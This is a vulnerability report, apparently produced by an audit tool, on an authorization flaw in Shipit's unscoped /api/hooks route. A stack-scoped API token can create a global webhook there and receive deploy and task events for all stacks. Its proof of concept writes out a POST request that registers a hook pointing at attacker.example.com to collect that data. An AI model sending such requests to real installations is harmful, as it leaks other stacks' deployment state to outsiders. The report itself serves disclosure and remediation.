### Title
Stack-scoped `ApiClient` can create a global webhook via the unscoped `/api/hooks` route, exfiltrating deploy/task state for every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` is mounted twice: once nested under a stack (`/api/stacks/*stack_id/hooks`) and once as a completely unscoped, top-level resource (`/api/hooks`). The unscoped route never consults the `ApiClient`'s `stack_id` restriction, so a token that is supposed to be confined to a single stack can use the unscoped endpoint to create a *global* `Hook` (`stack_id: nil`), which then receives events (`deploy`, `rollback`, `task`, `commit_status`, …) for **every** stack in the installation, not just the one the token is authorized for.

### Finding Description
`ApiClient#check_permissions!` only checks whether the required `"operation:scope"` string (e.g. `write:hook`) is present in the client's `permissions` array; it does not take `stack_id` into account at all: [1](#0-0) 

Stack scoping for an `ApiClient` is instead enforced implicitly, by routing all stack-bound reads/writes through `BaseController#stacks`/`#stack`, which filters `Stack.where(id: current_api_client.stack_id)` when `stack_id?` is true: [2](#0-1) 

`config/routes.rb` mounts `Shipit::Api::HooksController` both nested under a stack scope and, separately, as a bare top-level resource with no `stack_id` in the path: [3](#0-2) 

`HooksController` computes its scope with `stack_id`, which is only populated `if params[:stack_id].present?`; on the unscoped route this parameter is never present, so `stack_id` is `nil` and the controller operates directly on `Hook.where(stack_id: nil)` — i.e. the global hook scope — without ever calling `stack`/`stacks`, and therefore without ever checking that the request's `ApiClient` is authorized for any particular stack: [4](#0-3) 

Once a global `Hook` exists, `Hook.deliver` fans out every stack's events to it: the class method scopes as `where(stack_id: [nil, stack_id])`, meaning a `stack_id: nil` hook is included for the delivery of **every** stack's `deploy`/`rollback`/`task`/`commit_status`/etc. events, and it is triggered from `Stack`/`Task`/`Commit`/`ReviewStack`/`MergeRequest` model callbacks via `Hook.emit`: [5](#0-4) [6](#0-5) 

This breaks the binding: **the stack an `ApiClient` token authorizes ≠ the stack(s) whose events that token's writes can touch.** The `stack_id` attribute on `ApiClient` is the mechanism by which an administrator scopes a token to a single stack (as enforced for `/api/stacks/*stack_id/tasks`, `/deploys`, `/rollbacks`, the nested `hooks` route, etc.), but the top-level `/api/hooks` route silently drops that restriction as soon as no `stack_id` path segment is supplied, letting the same token create a hook whose `stack_id` is `nil` — the "listen to everything" scope.

### Impact Explanation
Any `ApiClient` granted `write:hook` (a permission independent from, and not gated by, the client's `stack_id`) can register a global `Hook` pointing at an attacker-controlled `delivery_url` for events such as `deploy`, `rollback`, `task`, `commit_status`. That hook will subsequently receive serialized `Task`/`Deploy`/`Commit` payloads (deploy status, commit SHAs, task/deploy permalinks, statuses, etc.) for every stack managed by the Shipit instance — including stacks the token was never authorized to read. This is an authorization-boundary violation: a token scoped by its creator to one stack is used to obtain ongoing read access to deploy/task state for all other stacks, matching the "unauthorized read of stack state / task streams / deploy output" class of impact.

### Likelihood Explanation
This requires only an existing `ApiClient` token that has `write:hook` permission (and was intended by the admin to be `stack_id`-scoped to a single stack, since `PERMISSIONS` and `stack_id` are independent attributes with no validation tying them together). No additional privilege escalation, code execution, or credential theft is needed — a single authenticated `POST /api/hooks` request (with `delivery_url`, `events`) is sufficient. The nested vs. top-level route duplication makes the oversight easy to miss during review since the nested, properly-scoped controller looks correctly restricted.

### Recommendation
- In `Shipit::Api::HooksController`, reject (403) any `create`/`update`/`destroy`/global `index` request when `current_api_client.stack_id?` is true but no `stack_id` path parameter was supplied, i.e. require a stack-scoped client to always operate through the nested stack route.
- Alternatively, have `#hooks` intersect the requested scope with `current_api_client.stack_id`, e.g. disallow creating/reading `stack_id: nil` hooks unless the client is unrestricted (`!current_api_client.stack_id?`).
- Add a model-level validation or a dedicated permission (e.g. `write:global_hook`) so that scoped clients can never write to the global hook scope regardless of controller wiring.

### Proof of Concept
1. As an administrator, create an `ApiClient` scoped to `stack_id: <stack A>` and grant it the `write:hook` permission (a normal-looking configuration, intended only to let the integration manage stack A's own hooks via `/api/stacks/<A>/hooks`).
2. Using that client's Basic-Auth token, send:
   ```
   POST /api/hooks
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "task", "commit_status"] }
   ```
   Because no `stack_id` is present in the path, `HooksController#stack_id` returns `nil`, and `hooks.create(params)` creates a `Hook` with `stack_id: nil` — bypassing the single-stack restriction entirely.
3. From then on, every deploy/task/commit-status event emitted by `Hook.emit` for **any** stack in the installation (not just stack A) is delivered to `https://attacker.example.com/collect`, per `Hook.deliver`'s `for_stack` scope including `stack_id: nil` hooks.

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
